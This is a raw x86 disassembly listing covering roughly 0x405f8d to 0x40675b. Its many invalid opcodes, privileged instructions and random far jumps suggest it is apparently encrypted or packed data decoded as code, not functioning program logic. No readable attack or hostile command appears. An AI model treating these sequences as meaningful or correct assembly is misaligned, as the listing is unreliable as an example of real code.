  405f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f8e:	mov    dl,0xfa
  405f90:	mov    ds:0xdf59877e,al
  405f95:	cmp    ah,BYTE PTR [ebx+0x7b]
  405f98:	pop    es
  405f99:	in     eax,dx
  405f9a:	push   esp
  405f9b:	outs   dx,DWORD PTR ds:[esi]
  405f9c:	cmc    
  405f9d:	sub    dl,al
  405f9f:	lods   al,BYTE PTR ds:[esi]
  405fa0:	iret   
  405fa1:	in     eax,0x5b
  405fa3:	cmp    esi,DWORD PTR [ebx+0x37]
  405fa6:	mov    es,edx
  405fa8:	inc    esp
  405fa9:	inc    edx
  405faa:	xor    eax,0xa2e2e49
  405faf:	pop    ss
  405fb0:	cmp    eax,0x389534fb
  405fb5:	(bad)  
  405fb6:	cmp    eax,0x81cc7af5
  405fbb:	jne    0x405f82
  405fbd:	fldenv cs:[eax-0x56853754]
  405fc4:	test   ch,0x2f
  405fc7:	pushf  
  405fc8:	(bad)  
  405fc9:	pop    edi
  405fca:	aam    0x26
  405fcc:	mov    al,0xf2
  405fce:	pushf  
  405fcf:	xchg   edx,eax
  405fd0:	dec    eax
  405fd1:	mov    bl,0xa1
  405fd3:	repz pop esi
  405fd5:	pop    ebx
  405fd6:	fsub   st(3),st
  405fd8:	pop    ss
  405fd9:	arpl   bp,cx
  405fdb:	add    dh,BYTE PTR [esi+0x3c]
  405fde:	out    0xbd,al
  405fe0:	aaa    
  405fe1:	fcomp  QWORD PTR [ebx+0x47]
  405fe4:	jmp    0xa46e:0x8071fe8e
  405feb:	fs dec eax
  405fed:	test   BYTE PTR [ecx],0x61
  405ff0:	test   al,0x3e
  405ff2:	and    ch,ah
  405ff4:	sub    BYTE PTR [ebp*4+0x54ef9e16],0xf4
  405ffc:	xor    BYTE PTR [ebx-0x7e],al
  405fff:	dec    eax
  406000:	mov    dh,0xf8
  406002:	bound  esi,QWORD PTR [eax+edx*4-0x47531401]
  406009:	mov    ebx,0x28ddb1bd
  40600e:	mov    ds:0x818060c3,al
  406013:	push   0x52ccaf97
  406018:	fwait
  406019:	pushf  
  40601a:	mov    DWORD PTR [eax+0x50572a32],esi
  406020:	aaa    
  406021:	mov    bh,0x4d
  406023:	jmp    0x89b8:0xeb6ce771
  40602a:	inc    edi
  40602b:	inc    esp
  40602c:	outs   dx,BYTE PTR ds:[esi]
  40602d:	retf   0x6981
  406030:	(bad)  
  406031:	xchg   esp,eax
  406032:	push   esp
  406033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406034:	jle    0x405fdc
  406036:	sbb    ah,BYTE PTR [edi]
  406038:	shl    BYTE PTR [ebx+0x66],1
  40603b:	outs   dx,BYTE PTR ds:[esi]
  40603c:	(bad)  
  40603e:	and    eax,ecx
  406040:	jns    0x406094
  406042:	mov    edi,0x1db043ee
  406047:	jmp    0xda5dadbf
  40604c:	or     cl,0x21
  40604f:	call   0x6223:0x4a5b5547
  406056:	xchg   ebx,eax
  406057:	shl    DWORD PTR [ecx],cl
  406059:	cwde   
  40605a:	sub    esi,DWORD PTR [edi-0x28b20286]
  406060:	inc    ebp
  406061:	imul   edx,DWORD PTR ds:0xb13568f4,0x7a000621
  40606b:	mov    dh,0x8f
  40606d:	add    eax,0xbe5df671
  406072:	adc    bl,BYTE PTR [esi]
  406074:	sti    
  406075:	lea    ebp,[edi+0x71]
  406078:	dec    edx
  406079:	jae    0x40604c
  40607b:	mov    dl,0xa
  40607d:	gs and eax,0x7088d944
  406083:	mov    cl,dl
  406085:	mov    ecx,0xe670bb81
  40608a:	sahf   
  40608b:	sub    DWORD PTR [edi+0x21],edx
  40608e:	nop
  40608f:	mov    BYTE PTR [eax-0x208b1eeb],ch
  406095:	hlt    
  406096:	sbb    eax,0xfb389688
  40609b:	inc    edx
  40609c:	repnz mov WORD PTR [edx-0x5bec5eeb],fs
  4060a3:	loope  0x4060e4
  4060a5:	mov    ebx,0x86ceab4a
  4060aa:	dec    ebx
  4060ab:	(bad)  [esi+esi*1+0x670b31fa]
  4060b2:	lods   al,BYTE PTR ds:[esi]
  4060b3:	jae    0x406055
  4060b5:	scas   eax,DWORD PTR es:[edi]
  4060b6:	jbe    0x406132
  4060b8:	adc    DWORD PTR [esi],edi
  4060ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060bb:	mov    bl,0xab
  4060bd:	pop    ecx
  4060be:	inc    ecx
  4060bf:	xchg   esp,eax
  4060c0:	cmp    ah,cl
  4060c2:	push   ebx
  4060c3:	fistp  QWORD PTR [ebp-0x78db3bb0]
  4060c9:	nop
  4060ca:	(bad)  
  4060cb:	std    
  4060cc:	ret    
  4060cd:	pushf  
  4060ce:	sti    
  4060cf:	cmp    BYTE PTR [eax+ecx*4],0x69
  4060d3:	(bad)
  4060d6:	aaa    
  4060d7:	xchg   esp,eax
  4060d8:	inc    ebx
  4060d9:	inc    ecx
  4060da:	mov    esi,0xf4ab958b
  4060df:	mov    ah,0x69
  4060e1:	sub    dl,bh
  4060e3:	and    dl,al
  4060e5:	mov    ecx,0x7cf86b89
  4060ea:	inc    ebx
  4060eb:	cmp    DWORD PTR ds:0x1df0801b,eax
  4060f1:	(bad)  
  4060f3:	ret    0xa8ba
  4060f6:	mov    eax,ds:0x16bf6235
  4060fb:	sub    cl,BYTE PTR [edx-0x6a]
  4060fe:	mov    ds:0x47d60f3d,al
  406103:	shl    ah,0xfa
  406106:	mov    ebx,0xa222163b
  40610b:	test   eax,0x2cb0a78d
  406110:	cdq    
  406111:	xor    cl,dh
  406113:	test   al,0xcc
  406115:	and    al,0xc1
  406117:	xor    DWORD PTR [eax-0x20],ecx
  40611a:	xchg   edi,eax
  40611b:	(bad)  
  40611c:	push   esi
  40611d:	cmp    dh,BYTE PTR [edi-0x2ce790f6]
  406123:	cmp    DWORD PTR [edi+0x40],esi
  406126:	int3   
  406127:	inc    eax
  406128:	adc    al,0xe1
  40612a:	mov    ds:0xd9305fee,eax
  40612f:	icebp  
  406130:	push   esi
  406131:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  406133:	cwde   
  406134:	pop    ss
  406135:	fcom   DWORD PTR [ebx]
  406137:	(bad)  
  406139:	mov    ds:0x91c391c8,al
  40613e:	or     BYTE PTR [eax-0x66],ch
  406141:	or     BYTE PTR [edx],bl
  406143:	xchg   ebp,esi
  406145:	sahf   
  406146:	inc    edi
  406147:	ins    DWORD PTR es:[edi],dx
  406148:	out    dx,eax
  406149:	mov    bl,0xa3
  40614b:	test   DWORD PTR [ebp+0x23],esp
  40614e:	cmc    
  40614f:	imul   esi,DWORD PTR [eax-0x3434808b],0xffffff9a
  406156:	adc    bh,BYTE PTR [edx]
  406158:	mov    dh,0x72
  40615a:	adc    BYTE PTR [esi+0x17],0x21
  40615e:	xchg   ecx,eax
  40615f:	imul   edi,DWORD PTR [edx+0x117a9baf],0x2d3053e1
  406169:	sbb    esi,DWORD PTR [eax-0x7d]
  40616c:	out    dx,eax
  40616d:	stos   DWORD PTR es:[edi],eax
  40616e:	mov    cl,bl
  406170:	clc    
  406171:	pop    eax
  406172:	mov    dl,0x4
  406174:	cs or  eax,0x219ac85d
  40617a:	sbb    eax,0x7a74ae4c
  40617f:	jbe    0x4061fc
  406181:	adc    bl,BYTE PTR [ebx-0x79b44550]
  406187:	cmp    al,0xec
  406189:	in     al,0x90
  40618b:	pusha  
  40618c:	pusha  
  40618d:	xchg   ecx,eax
  40618e:	call   0x359e:0xa4a97f35
  406195:	sub    cl,ah
  406197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406198:	inc    ebp
  406199:	enter  0x6325,0x7e
  40619d:	and    DWORD PTR [ebx],0xffffff85
  4061a0:	xchg   edi,ecx
  4061a2:	das    
  4061a3:	and    BYTE PTR [eax],0xdb
  4061a6:	fidivr WORD PTR [ebx]
  4061a8:	xor    dh,dl
  4061aa:	pop    edx
  4061ab:	fs out 0xbb,eax
  4061ae:	pop    ecx
  4061af:	push   esp
  4061b0:	cmp    BYTE PTR [ecx+0x68],0x2
  4061b4:	jns    0x4061ef
  4061b6:	nop
  4061b7:	push   es
  4061b8:	out    0xbc,eax
  4061ba:	fisttp QWORD PTR [ecx+0x344cb444]
  4061c0:	scas   eax,DWORD PTR es:[edi]
  4061c1:	dec    esp
  4061c2:	lock fdiv QWORD PTR [edi]
  4061c5:	sbb    DWORD PTR [ebp+eax*4-0x56],ebx
  4061c9:	inc    eax
  4061ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061cb:	fbstp  TBYTE PTR [eax+eax*2+0x28cd7207]
  4061d2:	cmp    ebp,DWORD PTR [eax+ebp*4]
  4061d5:	(bad)  
  4061d6:	cmc    
  4061d7:	or     ah,BYTE PTR [eax-0x5827ffae]
  4061dd:	mov    ebp,0x111938d6
  4061e2:	in     al,0x49
  4061e4:	jne    0x40624a
  4061e6:	dec    esi
  4061e7:	sbb    eax,0x9491ea24
  4061ec:	fucom  st(3)
  4061ee:	test   BYTE PTR [esi-0x602e82fb],0x19
  4061f5:	test   eax,0x4c288d7a
  4061fa:	or     eax,0x10f3b969
  4061ff:	fidiv  DWORD PTR [edx+0x5c]
  406202:	cmp    DWORD PTR ds:0xf8699eee,ecx
  406208:	popf   
  406209:	(bad)  
  40620a:	retf   0x1a7a
  40620d:	jns    0x4061f1
  40620f:	call   0x79da42ab
  406214:	fimul  WORD PTR [ebx-0x11243ea1]
  40621a:	mov    ch,0x9f
  40621c:	cld    
  40621d:	add    al,0xf0
  40621f:	in     al,dx
  406220:	addr16 inc esi
  406222:	add    al,0xec
  406224:	pushf  
  406225:	cmc    
  406226:	into   
  406227:	test   BYTE PTR [ebx-0x267fac8b],ah
  40622d:	popa   
  40622e:	test   al,0x92
  406230:	sub    al,ah
  406232:	dec    esi
  406233:	xchg   ebp,eax
  406234:	into   
  406235:	add    eax,0xde8df576
  40623a:	test   BYTE PTR [edx+0x3d],ch
  40623d:	fdivrp st(0),st
  40623f:	ins    BYTE PTR es:[edi],dx
  406240:	inc    edx
  406241:	lods   eax,DWORD PTR ds:[esi]
  406242:	inc    eax
  406243:	sub    al,0x15
  406245:	mov    ch,BYTE PTR [ebx-0x5be138d2]
  40624b:	push   esp
  40624c:	outs   dx,DWORD PTR ds:[esi]
  40624d:	loope  0x406201
  40624f:	jg     0x40622a
  406251:	mov    WORD PTR [ebx+0x6e2c2220],?
  406257:	xchg   ebx,eax
  406258:	hlt    
  406259:	repnz repz xchg esp,eax
  40625c:	or     eax,DWORD PTR [ecx+0x6b93b735]
  406262:	aas    
  406263:	hlt    
  406264:	loope  0x406270
  406266:	sahf   
  406267:	pop    ss
  406268:	sbb    bl,bl
  40626a:	ret    0x4368
  40626d:	cli    
  40626e:	idiv   BYTE PTR [eax-0x9]
  406271:	pop    ebx
  406272:	fwait
  406273:	sbb    BYTE PTR ss:[esp+ecx*4-0x6fe9498d],ch
  40627b:	xchg   esi,eax
  40627c:	test   DWORD PTR [ecx+0x2c],0x7adf9ad8
  406283:	dec    edx
  406284:	xchg   DWORD PTR [eax+esi*2],edx
  406287:	sub    BYTE PTR [ecx+0x26d4df75],0xb6
  40628e:	enter  0xab02,0xb2
  406292:	js     0x406254
  406294:	ins    DWORD PTR es:[edi],dx
  406295:	mov    cl,0xc
  406297:	dec    ecx
  406298:	mov    eax,ds:0xc1656986
  40629d:	sbb    BYTE PTR ds:0x41f0262,al
  4062a3:	(bad)  
  4062a4:	xchg   ax,ax
  4062a6:	ins    DWORD PTR es:[edi],dx
  4062a7:	cmp    ah,bl
  4062a9:	test   al,0x6e
  4062ab:	lock mov ah,0x7b
  4062ae:	sbb    bl,BYTE PTR [eax+0x36]
  4062b1:	fld    TBYTE PTR [edi]
  4062b3:	nop    DWORD PTR [eax+0x7702606b]
  4062ba:	stc    
  4062bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062bc:	lods   al,BYTE PTR ds:[esi]
  4062bd:	bound  edi,QWORD PTR [edi+0x14e64be8]
  4062c3:	inc    BYTE PTR [edi]
  4062c5:	push   ss
  4062c6:	mov    dl,0xa
  4062c8:	fcomip st,st(2)
  4062cb:	(bad)  
  4062cc:	out    dx,eax
  4062cd:	loop   0x40634e
  4062cf:	jae    0x40629e
  4062d1:	or     al,0xcb
  4062d3:	cmp    ebp,0x42
  4062d6:	and    DWORD PTR [eax+0x5eef57c3],ebp
  4062dc:	xor    al,0x1
  4062de:	dec    eax
  4062df:	in     al,0xbb
  4062e1:	test   eax,0x2fe057a1
  4062e6:	ret    0xd5ff
  4062e9:	xor    edi,DWORD PTR [edx]
  4062eb:	or     eax,0xaf1d9f9a
  4062f0:	fldenv [eax-0x4a]
  4062f3:	mov    dh,BYTE PTR [esi]
  4062f5:	rcl    ah,0x8f
  4062f8:	xchg   ebx,eax
  4062f9:	call   0xfef8f874
  4062fe:	jecxz  0x40635a
  406300:	pop    ss
  406301:	add    ebp,DWORD PTR [eax+0x5e90855d]
  406307:	push   eax
  406308:	(bad)  ds:0xc3eb2372
  40630e:	(bad)  
  40630f:	sbb    DWORD PTR [esi-0xc07295b],edx
  406315:	cmp    ecx,DWORD PTR ds:0x77d42c06
  40631b:	cmp    esi,DWORD PTR [ebx+0x7dca6ac3]
  406321:	inc    esp
  406322:	daa    
  406323:	aam    0xee
  406325:	push   esp
  406326:	jno    0x4062e3
  406328:	cwde   
  406329:	mov    esp,0xe1fb13e2
  40632e:	and    DWORD PTR [edi],0x54ef68eb
  406334:	mov    DWORD PTR ds:0x28e92a85,esi
  40633a:	xchg   edx,eax
  40633b:	adc    ebx,DWORD PTR [edi+0x3a]
  40633e:	jecxz  0x40636a
  406340:	hlt    
  406341:	jae    0x4062da
  406343:	rol    BYTE PTR [edx+0x4441442d],1
  406349:	shl    DWORD PTR [edi+0x35],cl
  40634c:	imul   esi,DWORD PTR [eax-0xb64854e],0xffffffbf
  406353:	std    
  406354:	out    dx,al
  406355:	in     eax,dx
  406356:	cs sub ebp,esp
  406359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635a:	mov    dh,0xa7
  40635c:	jns    0x40634b
  40635e:	mov    dl,0xa5
  406360:	(bad)  
  406361:	je     0x4063d8
  406363:	jns    0x406390
  406365:	cmp    al,0x41
  406367:	cwde   
  406368:	daa    
  406369:	lahf   
  40636a:	sbb    BYTE PTR [ecx-0x2e],0x16
  40636e:	jmp    0xf957db4d
  406373:	cli    
  406374:	xchg   edx,eax
  406375:	and    BYTE PTR [ecx],ch
  406377:	mov    ecx,ebx
  406379:	nop
  40637a:	repz add DWORD PTR [edx-0x4a5137cc],0x481103c9
  406385:	in     eax,0xd3
  406387:	mov    esp,0x5a7831d8
  40638c:	pusha  
  40638d:	test   eax,0x6ee31c7
  406392:	test   eax,0xffe1875a
  406397:	mov    BYTE PTR [ecx],0x6e
  40639a:	int3   
  40639b:	aaa    
  40639c:	xor    ebp,DWORD PTR [ebx-0x72bfeb4a]
  4063a2:	lods   eax,DWORD PTR ds:[esi]
  4063a3:	out    dx,al
  4063a4:	dec    esp
  4063a5:	cdq    
  4063a6:	cmc    
  4063a7:	into   
  4063a8:	leave  
  4063a9:	sti    
  4063aa:	leave  
  4063ab:	pop    ebx
  4063ac:	pop    esp
  4063ad:	test   BYTE PTR [esi],cl
  4063af:	outs   dx,DWORD PTR ds:[esi]
  4063b0:	sub    al,0x41
  4063b2:	repnz mov ebx,0xbf2fe11
  4063b8:	fwait
  4063b9:	and    BYTE PTR [esi],ch
  4063bb:	pop    ds
  4063bc:	test   DWORD PTR [ebx],esi
  4063be:	(bad)  
  4063bf:	cld    
  4063c0:	jecxz  0x406346
  4063c2:	test   eax,0xb1f426a5
  4063c7:	pop    eax
  4063c8:	xor    DWORD PTR ds:0xdb723ec9,edx
  4063ce:	xchg   ebp,eax
  4063cf:	pop    esi
  4063d0:	inc    esi
  4063d1:	ss loop 0x40642d
  4063d4:	out    0xac,eax
  4063d6:	lds    edx,FWORD PTR ds:0x681c1e01
  4063dc:	xchg   edi,eax
  4063dd:	mov    bh,0x68
  4063df:	inc    edi
  4063e0:	sbb    esi,DWORD PTR [edx-0x6f7fee56]
  4063e6:	sub    BYTE PTR [ecx],al
  4063e8:	sahf   
  4063e9:	lds    eax,FWORD PTR [edi+edx*4]
  4063ec:	fucomi st,st(2)
  4063ee:	js     0x406452
  4063f0:	mov    eax,0x2bcbd0d6
  4063f5:	mov    dl,0xa0
  4063f7:	add    al,0xe7
  4063f9:	jb     0x40646f
  4063fb:	lods   al,BYTE PTR ds:[esi]
  4063fc:	jno    0x406447
  4063fe:	std    
  4063ff:	call   0x6cb80277
  406404:	imul   edx,DWORD PTR [edx],0x61
  406407:	test   BYTE PTR [esi-0x3d],ch
  40640a:	cdq    
  40640b:	cmp    BYTE PTR [edx],ah
  40640d:	mov    cl,0x68
  40640f:	or     esp,DWORD PTR [edi]
  406411:	sub    eax,0xb605a3d
  406416:	retf   0x1f5c
  406419:	or     edx,ebx
  40641b:	add    DWORD PTR ds:0x47cc4492,edx
  406421:	add    dh,BYTE PTR [ebx-0xd31804d]
  406427:	leave  
  406428:	mov    al,BYTE PTR ds:0x1bfd5cb0
  40642e:	push   edi
  40642f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406430:	pop    ebx
  406431:	adc    BYTE PTR [esi],ch
  406433:	adc    eax,0x4c076625
  406438:	mov    esi,0x8cf0c0d4
  40643d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40643e:	(bad)  
  40643f:	xor    ebp,DWORD PTR [ebp+0x59ef32ed]
  406445:	(bad)  [edi+0x44]
  406448:	jge    0x4063dd
  40644a:	sbb    eax,0x8d3bac11
  40644f:	xor    ah,BYTE PTR [ebx+0x2d]
  406452:	clc    
  406453:	mov    ds,WORD PTR [eax+0x2346a1c7]
  406459:	test   eax,0x18c58da9
  40645e:	mov    gs,WORD PTR [ecx]
  406460:	out    dx,al
  406461:	aad    0xac
  406463:	out    dx,al
  406464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406465:	scas   eax,DWORD PTR es:[edi]
  406466:	lea    esi,[ecx]
  406468:	cwde   
  406469:	cmp    DWORD PTR [edx+0x52],0x31ffed3d
  406470:	cmp    cl,cl
  406472:	mov    bh,0x35
  406474:	mov    dl,0xcb
  406476:	nop
  406477:	stos   BYTE PTR es:[edi],al
  406478:	aas    
  406479:	popf   
  40647a:	dec    esp
  40647b:	sbb    eax,0x8a9788e1
  406480:	dec    edi
  406481:	data16 out dx,al
  406483:	icebp  
  406484:	push   ebx
  406485:	xor    al,0xe4
  406487:	adc    al,bl
  406489:	fiadd  WORD PTR [eax-0x2b]
  40648c:	aas    
  40648d:	or     ebp,DWORD PTR [edx]
  40648f:	xor    cl,BYTE PTR [edx-0x2e]
  406492:	dec    edx
  406493:	cmp    esi,DWORD PTR ds:0x1ac3f16f
  406499:	mov    ch,0xa3
  40649b:	push   edx
  40649c:	push   cs
  40649d:	push   es
  40649e:	inc    esp
  40649f:	in     eax,0x58
  4064a1:	data16 xor BYTE PTR [ebx-0x16],ah
  4064a5:	add    eax,0xd1715b5a
  4064aa:	mov    dl,0x9e
  4064ac:	je     0x40650e
  4064ae:	pop    ecx
  4064af:	not    BYTE PTR [ecx]
  4064b1:	outs   dx,DWORD PTR ds:[esi]
  4064b2:	jmp    0x6f3abe2e
  4064b7:	shr    esi,cl
  4064b9:	pop    esi
  4064ba:	jbe    0x40649d
  4064bc:	mov    ecx,0xe8c22f0b
  4064c1:	and    DWORD PTR [edx-0x66],esi
  4064c4:	fwait
  4064c5:	inc    ebx
  4064c6:	jb     0x406516
  4064c8:	sub    bh,BYTE PTR [esp+eax*8+0x42c966e8]
  4064cf:	mov    ch,0x2f
  4064d1:	or     bl,BYTE PTR [esi+0x24]
  4064d4:	shl    BYTE PTR [edi-0x10],1
  4064d7:	ins    BYTE PTR es:[edi],dx
  4064d8:	sbb    al,0xf2
  4064da:	js     0x4064c8
  4064dc:	push   ebx
  4064dd:	inc    esi
  4064de:	enter  0x601b,0xc0
  4064e2:	js     0x40653b
  4064e4:	push   0x3bc21be9
  4064e9:	jle    0x4064a4
  4064eb:	nop
  4064ec:	mov    esi,edx
  4064ee:	cmp    BYTE PTR [edx],bh
  4064f0:	mov    ecx,0xff40879a
  4064f5:	test   DWORD PTR [eax],esi
  4064f7:	rcl    BYTE PTR [edx],1
  4064f9:	lods   al,BYTE PTR ds:[esi]
  4064fa:	lds    ecx,FWORD PTR [esi+0x29]
  4064fd:	ss ins DWORD PTR es:[edi],dx
  4064ff:	sbb    ch,BYTE PTR [ebp-0x34]
  406502:	add    DWORD PTR [edx-0x30],edx
  406505:	div    DWORD PTR [esp+esi*8]
  406508:	bound  ecx,QWORD PTR [ebp-0x2495bc7c]
  40650e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40650f:	loop   0x40649f
  406511:	xchg   esi,eax
  406512:	jmp    0x5efb:0x5d7b8d69
  406519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40651a:	repz inc edi
  40651c:	mov    eax,ds:0x85123b1a
  406521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406522:	stc    
  406523:	aad    0xb2
  406525:	or     DWORD PTR [eax-0x5e4455ae],eax
  40652b:	pop    ds
  40652c:	inc    ebx
  40652d:	sub    edx,DWORD PTR [edx]
  40652f:	xchg   DWORD PTR [esp+eiz*2-0x3ce9106e],ecx
  406536:	fs jns 0x4064cd
  406539:	bound  ecx,QWORD PTR [edi-0x51]
  40653c:	stos   BYTE PTR es:[edi],al
  40653d:	ds (bad) 
  40653f:	push   ebp
  406540:	inc    edi
  406541:	add    eax,0x2f4ab343
  406546:	call   DWORD PTR [eax+0x44c26120]
  40654c:	gs je  0x4064fb
  40654f:	sub    dh,BYTE PTR [ebx+0x5f]
  406552:	sbb    eax,ebx
  406554:	outs   dx,BYTE PTR ds:[esi]
  406555:	dec    esp
  406556:	mov    bh,0xd3
  406558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406559:	dec    esp
  40655a:	sbb    DWORD PTR [esi+0x4562ff5],edx
  406560:	sti    
  406561:	xlat   BYTE PTR ds:[ebx]
  406562:	cmc    
  406563:	outs   dx,DWORD PTR es:[esi]
  406565:	test   bh,bh
  406567:	scas   eax,DWORD PTR es:[edi]
  406568:	mov    edx,ss
  40656a:	add    esp,DWORD PTR [edi-0x5a]
  40656d:	sbb    BYTE PTR [ecx+edi*1],bh
  406570:	loope  0x4065c4
  406572:	imul   eax,DWORD PTR ds:0xf1645065,0xffffffd7
  406579:	repnz imul ebp,ebx,0x88d4429d
  406580:	xchg   cl,bh
  406582:	fdiv   DWORD PTR [ebp+0x7d]
  406585:	shl    DWORD PTR [edx-0x326ad964],cl
  40658b:	push   ebx
  40658c:	push   es
  40658d:	imul   esp,esp,0x3d
  406590:	(bad)  
  406591:	xor    DWORD PTR [edi],esp
  406593:	adc    BYTE PTR ds:0xe4fc2fa8,dl
  406599:	mov    ch,0x90
  40659b:	adc    ch,dh
  40659d:	jmp    0x40660d
  40659f:	add    cl,BYTE PTR [edx-0x5e]
  4065a2:	dec    esi
  4065a3:	inc    esi
  4065a4:	sahf   
  4065a5:	icebp  
  4065a6:	dec    edi
  4065a7:	jne    0x40653f
  4065a9:	in     eax,dx
  4065aa:	cmc    
  4065ab:	std    
  4065ac:	clc    
  4065ad:	dec    eax
  4065ae:	test   DWORD PTR [ebp-0x38],0x3b7be2af
  4065b5:	gs test al,0xd2
  4065b8:	mov    ebx,0x1cc901f7
  4065bd:	sbb    al,0x2
  4065bf:	es retf 0xcd85
  4065c3:	in     al,0x1d
  4065c5:	push   0xf4b74446
  4065ca:	(bad)  
  4065cb:	iret   
  4065cc:	or     ebx,ecx
  4065ce:	add    ecx,DWORD PTR [ebp-0xd9ee047]
  4065d4:	or     dl,BYTE PTR [edx+0x7876b259]
  4065da:	hlt    
  4065db:	inc    esp
  4065dc:	popa   
  4065dd:	rcl    BYTE PTR [ecx+ebp*2+0xdde10a1],0x80
  4065e5:	into   
  4065e6:	sub    DWORD PTR [edi-0x60],eax
  4065e9:	js     0x406573
  4065eb:	or     al,BYTE PTR [esi-0x9]
  4065ee:	popa   
  4065ef:	enter  0x7291,0x12
  4065f3:	adc    cl,dh
  4065f5:	(bad)  
  4065f6:	in     al,0x85
  4065f8:	jne    0x406649
  4065fa:	mov    cl,0x54
  4065fc:	sahf   
  4065fd:	fild   QWORD PTR ds:0x590d1f31
  406603:	fidivr WORD PTR [ecx+0x5d]
  406606:	or     al,0x99
  406608:	and    edx,DWORD PTR [eax]
  40660a:	jmp    0xbcbf:0xdebefa02
  406611:	sbb    BYTE PTR [edx+edx*2+0x4c],al
  406615:	lock sub ch,BYTE PTR [esi-0x6]
  406619:	stos   DWORD PTR es:[edi],eax
  40661a:	pop    DWORD PTR [edx]
  40661c:	test   al,0x94
  40661e:	mov    al,0x26
  406620:	mov    al,0x96
  406622:	repnz loopne 0x4065e3
  406625:	arpl   WORD PTR [ebp+0x5c014e73],ax
  40662b:	jmp    0x406682
  40662d:	nop
  40662e:	ins    BYTE PTR es:[edi],dx
  40662f:	sbb    DWORD PTR [ebx+0x7],ebx
  406632:	fisttp DWORD PTR [ecx]
  406634:	sbb    al,0xb7
  406636:	xlat   BYTE PTR ds:[ebx]
  406637:	push   ecx
  406638:	mov    ds:0xb6e8ecd4,eax
  40663d:	inc    edx
  40663e:	mov    bl,0xca
  406640:	cs or  al,0x19
  406643:	mov    ch,0xd6
  406645:	push   eax
  406646:	scas   eax,DWORD PTR es:[edi]
  406647:	fnstcw WORD PTR [ecx+0x626346a6]
  40664d:	dec    ecx
  40664e:	mov    ch,0x9e
  406650:	sub    ah,ah
  406652:	add    eax,0x69c0a89f
  406657:	mov    ebx,0x28cbf108
  40665c:	or     DWORD PTR [ecx+0x70d88ad5],0xffffffa9
  406663:	out    dx,al
  406664:	retf   0x5d79
  406667:	lods   eax,DWORD PTR ds:[esi]
  406668:	lock add al,0x4d
  40666b:	adc    eax,0x3fbf58d3
  406670:	sbb    eax,0x774bc29e
  406675:	int3   
  406676:	cs popa 
  406678:	daa    
  406679:	xor    DWORD PTR ds:0x70828edd,ebx
  40667f:	and    ah,dl
  406681:	push   ebp
  406682:	inc    eax
  406683:	mov    ch,0x2f
  406685:	and    eax,eax
  406687:	sub    eax,0x6b3b17f6
  40668c:	dec    ecx
  40668d:	xor    al,0x9c
  40668f:	lea    ebp,[edx*1+0x47136ca7]
  406696:	cli    
  406697:	dec    ebp
  406698:	(bad)  
  406699:	fnstenv [ecx+0x746109e2]
  40669f:	(bad)  
  4066a0:	imul   ebx,DWORD PTR [ecx],0x2af41e50
  4066a6:	je     0x4066b2
  4066a8:	mov    edx,0x1bebf6c9
  4066ad:	ss inc ebx
  4066af:	pop    edx
  4066b0:	mov    ds:0xf43b353,eax
  4066b5:	jmp    0xf25bd29
  4066ba:	inc    ecx
  4066bb:	push   ds
  4066bc:	mov    bl,0x24
  4066be:	mov    bh,0x44
  4066c0:	outs   dx,BYTE PTR ds:[esi]
  4066c1:	std    
  4066c2:	lods   al,BYTE PTR ds:[esi]
  4066c3:	out    dx,eax
  4066c4:	pop    ss
  4066c5:	icebp  
  4066c6:	jecxz  0x4066f9
  4066c8:	add    eax,0x9a7fba14
  4066cd:	xchg   edx,eax
  4066ce:	push   0xffffffd5
  4066d0:	mov    bh,0x3f
  4066d2:	shl    DWORD PTR [edi-0x6fc5aa7c],0xc6
  4066d9:	enter  0xae70,0x7d
  4066dd:	outs   dx,BYTE PTR ds:[esi]
  4066de:	stos   DWORD PTR es:[edi],eax
  4066df:	xor    al,0x1e
  4066e1:	sub    dl,BYTE PTR [edx+ecx*1-0x7f]
  4066e5:	rcl    eax,1
  4066e7:	dec    esp
  4066e8:	pop    ecx
  4066e9:	(bad)  
  4066ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066eb:	sub    BYTE PTR [ecx+0x7cf6f1f6],0x5
  4066f2:	mov    BYTE PTR [ecx],bh
  4066f4:	add    al,0xa9
  4066f6:	jb     0x4066a1
  4066f8:	cmc    
  4066f9:	cmp    al,0x4e
  4066fb:	pop    edi
  4066fc:	ret    0xe7f5
  4066ff:	(bad)  
  406700:	enter  0x7905,0x93
  406704:	retf   0xbb70
  406707:	enter  0x4cb3,0xc
  40670b:	mov    ds:0xd025022c,al
  406710:	(bad)  
  406711:	fs scas eax,DWORD PTR es:[edi]
  406713:	cmp    al,0x4f
  406715:	push   ebp
  406716:	imul   esi,ecx,0x3f8cba39
  40671c:	pop    es
  40671d:	fadd   st,st(0)
  40671f:	dec    edi
  406720:	xlat   BYTE PTR ds:[ebx]
  406721:	sbb    BYTE PTR [edx+0xd],bh
  406724:	int    0xa6
  406726:	jmp    0x40676e
  406728:	aad    0xe4
  40672a:	mov    cl,0xaa
  40672c:	xlat   BYTE PTR ds:[ebx]
  40672d:	popf   
  40672e:	icebp  
  40672f:	pop    ds
  406730:	and    al,0xbb
  406732:	xor    al,0xa0
  406734:	mov    ch,bh
  406736:	mov    ah,0xc9
  406738:	rcl    DWORD PTR [ebx+edi*8+0x39],0x38
  40673d:	je     0x4066f7
  40673f:	push   es
  406740:	call   0xad70:0x14818df6
  406747:	xor    BYTE PTR [esi-0x2],0x9a
  40674b:	idiv   BYTE PTR [ecx]
  40674d:	pop    ss
  40674e:	fwait
  40674f:	pusha  
  406750:	aas    
  406751:	mov    BYTE PTR [esi+ecx*2],al
  406754:	cli    
  406755:	mov    es,WORD PTR [ebp-0x52a02fb7]
  40675b:	inc    ecx
